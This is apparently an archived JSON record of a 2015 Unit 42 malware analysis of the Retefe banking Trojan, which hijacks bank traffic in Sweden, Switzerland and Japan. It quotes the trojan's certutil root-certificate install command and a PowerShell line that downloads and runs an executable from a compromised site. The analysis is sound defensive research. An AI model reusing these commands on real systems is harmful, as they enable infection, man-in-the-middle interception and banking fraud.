{
    "id": "f073596a-068a-45cb-a731-287f7aa0e283",
    "created_at": "2023-01-12T15:08:37.627537Z",
    "updated_at": "2025-03-27T02:05:42.722448Z",
    "deleted_at": null,
    "sha1_hash": "73f7aa412503578f195883abb58e05b52ba4ed03",
    "title": "2015-08-20 - Retefe Banking Trojan Targets Sweden, Switzerland and Japan",
    "authors": "",
    "file_creation_date": "2022-05-28T15:11:39Z",
    "file_modification_date": "2022-05-28T15:11:39Z",
    "file_size": 133561,
    "plain_text": "# Retefe Banking Trojan Targets Sweden, Switzerland and Japan\n\n**[researchcenter.paloaltonetworks.com/2015/08/retefe-banking-trojan-targets-sweden-switzerland-and-japan/](https://researchcenter.paloaltonetworks.com/2015/08/retefe-banking-trojan-targets-sweden-switzerland-and-japan/)**\n\nBrandon Levene, Robert Falcone, Josh Grunzweig, Bryan Lee, Ryan Olson August 20, 2015\n\nBy [Brandon Levene,](https://unit42.paloaltonetworks.com/author/brandon-levene/) [Robert Falcone,](https://unit42.paloaltonetworks.com/author/robertfalcone/) [Josh Grunzweig,](https://unit42.paloaltonetworks.com/author/joshgruznweig/) [Bryan Lee and](https://unit42.paloaltonetworks.com/author/bryanlee/) [Ryan Olson](https://unit42.paloaltonetworks.com/author/ryan-olson/)\n\nAugust 20, 2015 at 2:03 PM\n\n[Category: Financial Services,](https://unit42.paloaltonetworks.com/category/financial-services/) [Malware,](https://unit42.paloaltonetworks.com/category/malware-2/) [Threat Prevention,](https://unit42.paloaltonetworks.com/category/threat-prevention-2/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [AutoFocus,](https://unit42.paloaltonetworks.com/tag/autofocus/) [banking,](https://unit42.paloaltonetworks.com/tag/banking/) [Powershell,](https://unit42.paloaltonetworks.com/tag/powershell/) [Retefe,](https://unit42.paloaltonetworks.com/tag/retefe/) [Smoke Loader,](https://unit42.paloaltonetworks.com/tag/smoke-loader/) [Trojan,](https://unit42.paloaltonetworks.com/tag/trojan/) [WildFire](https://unit42.paloaltonetworks.com/tag/wildfire/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/retefe-banking-trojan-targets-sweden-switzerland-and-japan/)\n\nRetefe is one of the most targeted banking Trojans currently in the wild. While other families\nsuch as Zeus and Citadel are widely adopted by attackers targeting banking websites around\nthe world, Retefe is consistently used to target victims in Sweden, Switzerland and Japan.\n\n[In the last two weeks we have detected a surge of e-mails using AutoFocus, each carrying](https://www.paloaltonetworks.com/products/platforms/subscriptions/autofocus.html)\nthe Retefe Trojan and targeting organizations in Western Europe and Japan.\n\nFigure 1: AutoFocus map of recent Retefe Trojan recipients\n\n\n-----\n\nThe attack e-mails are using a variety of order and receipt themes, each tailored to the\ncountry they are targeting and using dated file names to make them appear more relevant.\nThe e-mails most often claim to be from a local electronics retailer.\n\nFigure 2: Retefe sample delivered to Swedish target.\n\nOn a global scale, Retefe is a rather small threat, but that appears to be by design. The\nmalware hijacks connections to Swiss, Swedish and Japanese financial institutions to assist\nthe attacker in committing fraud. The malware carried in the most recent campaigns also\ndownloads and installs the Smoke Loader Trojan, which is a modular backdoor capable of\nstealing credentials and installing additional malware.\n\n## Retefe Behavior\n\nRetefe is different from most banking Trojans, which typically attack web browser software to\ncapture login credentials before they are encrypted with SSL and sent to the bank’s web\nserver. Instead, Retefe uses the Windows PowerShell to execute a series of commands that\ninstalls a new root certificate on the system and a proxy configuration to re-route the traffic to\nthe targeted banking websites.\n\nThe Retefe Trojan writes the root certificate to the disk and then uses the following command\nto install it on the sytem.\n\n_certutil -addstore -f -user ROOT ProgramData\\cert512121.der_\n\nRetefe has used many certificates in the past, but the latest one is a fake “thawte Inc.”\ncertificate.\n\n\n-----\n\nFigure 3: Fake “thawte, Inc.” Root Certificate installed by Retefe.\n\nAfter installing the certificate, Retefe makes a request to a server over HTTPS to retrieve\nJavaScript code that will reconfigure the system proxy for web browsing to route traffic for\nspecific banking domains through a server controlled by the attacker. The proxy server\nperforms a man-in-the-middle attack against the traffic, decrypting and possibly modifying the\nrequest before re-encrypting the data and passing it on to the bank. Retefe installs the new\nroot certificate to prevent users from receiving a notification that the website they are\ncontacting should not be trusted.\n\nThe Retefe command and control server appears to only return this proxy configuration code\nif the infected host is located in Switzerland, Sweden or Japan. Retefe changes command\nand control servers frequently, but the most recent campaigns use domains that mimic the\nnames of VPN services, including:\n\nsecurevpnalarm.net\nhsshvpn.net\n\nAfter installing the certificate and reconfiguring the system proxy, Retefe uses another\nPowerShell command to download an additional executable. In many cases we have\n[identified this malware as a variant of Smoke Loader, a modular backdoor Trojan capable of](http://stopmalvertising.com/rootkits/analysis-of-smoke-loader.html)\nstealing credentials from the infected system.\n\nRetefe variants download additional malware from multiple URLs, but in most cases the\nserver hosting the executable is a compromised website hosted in the country being targeted\nby the sample. Below is one example of the PowerShell script that initiates the download and\nexecutes it.\n\n_powershell.exe -Command (New-Object_\n_System.Net.WebClient).DownloadFile('http://www.schweizerhof-_\n_wetzikon[.]ch/images/rtucrtmirumctrutbitueriumxe/ivotyimoyctorieotcmir.exe'_\n\n\n-----\n\n_ProgramData\\Microsoft-KB512118.exe );(New-Object -com_\n_Shell.Application).ShellExecute('ProgramData\\Microsoft-KB512118.exe');_\n\nWe suspect the actors behind Retefe began downloading Smoke Loader to help monetize\ninfection of systems outside of their three targeted nations.\n\n## Conclusion\n\nWhile Retefe’s distribution is small on a global scale, its attacks are specifically targeted at\nonline banking customers in just a few countries. The most recent campaign shows that\nRetefe may also threaten users in other countries as they begin using their infections to\ninstall additional malware.\n\n[Palo Alto Networks WildFire identifies Retefe and Smoke Loader samples as malicious and](https://www.paloaltonetworks.com/products/technologies/wildfire.html)\n[AutoFocus users can identify these samples using the SmokeLoader and](https://www.paloaltonetworks.com/products/platforms/subscriptions/autofocus.html) [Retefe tags.](https://autofocus.paloaltonetworks.com/#/tag/Commodity.Retefe)\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2015/2015-08-20 - Retefe Banking Trojan Targets Sweden, Switzerland and Japan.pdf"
    ],
    "report_names": [
        "2015-08-20 - Retefe Banking Trojan Targets Sweden, Switzerland and Japan.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536117,
    "ts_updated_at": 1743041142,
    "ts_creation_date": 1653750699,
    "ts_modification_date": 1653750699,
    "files": {
        "pdf": "https://archive.orkl.eu/73f7aa412503578f195883abb58e05b52ba4ed03.pdf",
        "text": "https://archive.orkl.eu/73f7aa412503578f195883abb58e05b52ba4ed03.txt",
        "img": "https://archive.orkl.eu/73f7aa412503578f195883abb58e05b52ba4ed03.jpg"
    }
}